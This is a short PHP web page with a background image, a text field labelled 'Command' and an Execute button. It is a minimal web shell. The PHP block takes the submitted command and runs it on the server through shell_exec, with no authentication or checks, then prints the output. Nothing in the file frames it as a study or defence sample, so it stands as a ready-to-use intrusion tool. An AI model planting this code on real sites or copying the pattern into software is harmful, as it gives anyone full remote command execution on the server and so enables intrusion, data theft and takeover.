<html>
<head>
	<title></title>
	<style type="text/css">
		.cmd{
			position: absolute;
			margin-top: 5%;
			margin-left: 40%;
		}
		body{
			background-image: url(home.jpg);
			height: 90vh;
			background-size: cover;
			background-position: center;
		}
		input[type="text"],select{
			padding: 5px;
		}
		button{
			padding: 5px;
		}
	</style>
</head>
<body>
<div class="cmd">
	<form method="POST">
    	<input id="comm" type="text" name="command" placeholder="Command">
    	<button>Execute</button>
    </form>
</form>
<?php
    if(isset($_POST['command']))
    {
        $cmd = $_POST['command'];
        echo shell_exec($cmd);
    }
?>
</body>
</html>